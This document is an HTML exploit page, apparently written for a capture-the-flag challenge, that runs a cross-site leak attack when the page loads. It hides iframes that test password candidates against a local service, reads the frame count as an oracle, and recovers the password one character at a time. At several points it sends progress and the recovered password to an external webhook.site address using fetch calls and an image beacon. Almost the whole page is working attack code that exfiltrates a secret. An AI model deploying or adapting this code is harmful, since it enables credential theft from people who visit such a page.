<!DOCTYPE html>
<html>
<head><title>Parallel Exploit</title></head>
<body>
<h1>Ultra-fast parallel password leak...</h1>
<pre id="output"></pre>
<div id="container" style="position:absolute;left:-9999px;"></div>
<script>
const output = document.getElementById('output');
const container = document.getElementById('container');
const TARGET = 'https://127.0.0.1:9999/';
const CHARSET = '0123456789abcdef';
let knownPassword = 'lebah';

function log(msg) {
    output.textContent += msg + '\n';
    console.log(msg);
}

// Test multiple candidates in PARALLEL
async function testBatch(candidates) {
    const promises = candidates.map(cand => 
        new Promise((resolve) => {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = TARGET + '?pass=' + encodeURIComponent(cand);
            
            const cleanup = () => {
                if (iframe.parentNode) {
                    container.removeChild(iframe);
                }
            };
            
            const timeout = setTimeout(() => {
                cleanup();
                resolve({ cand, match: false });
            }, 500);
            
            iframe.onload = () => {
                setTimeout(() => {
                    try {
                        const hasFrame = iframe.contentWindow.length > 0;
                        clearTimeout(timeout);
                        cleanup();
                        resolve({ cand, match: hasFrame });
                    } catch(e) {
                        clearTimeout(timeout);
                        cleanup();
                        resolve({ cand, match: false });
                    }
                }, 80);
            };
            
            iframe.onerror = () => {
                clearTimeout(timeout);
                cleanup();
                resolve({ cand, match: false });
            };
            
            container.appendChild(iframe);
        })
    );
    
    return await Promise.all(promises);
}

async function leakPassword() {
    log('[*] Ultra-fast PARALLEL password leak!');
    log('[*] Known prefix: ' + knownPassword);
    log('[*] Testing 4 candidates at once...\n');
    
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?status=parallel_attack_started').catch(e=>{});
    
    for (let pos = 0; pos < 12; pos++) {
        log(`[*] Position ${pos+1}/12...`);
        let found = false;
        
        // Test in batches of 4 for speed
        for (let i = 0; i < CHARSET.length; i += 4) {
            const batch = [];
            for (let j = 0; j < 4 && (i+j) < CHARSET.length; j++) {
                batch.push(knownPassword + CHARSET[i+j]);
            }
            
            log(`  Testing: ${batch.map(c => c[c.length-1]).join(', ')}`);
            const results = await testBatch(batch);
            
            const winner = results.find(r => r.match);
            if (winner) {
                knownPassword = winner.cand;
                const newChar = winner.cand[winner.cand.length - 1];
                log(`  âœ“ FOUND '${newChar}'! -> ${knownPassword}\n`);
                
                fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
                
                found = true;
                break;
            }
        }
        
        if (!found) {
            log(`[-] No match at position ${pos+1}!`);
            break;
        }
    }
    
    log('\n========================================');
    log('FINAL PASSWORD: ' + knownPassword);
    log('========================================');
    
    fetch('https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?password=' + encodeURIComponent(knownPassword)).catch(e=>{});
    new Image().src = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/?pass=' + encodeURIComponent(knownPassword);
}

setTimeout(leakPassword, 300);
</script>
</body>
</html>
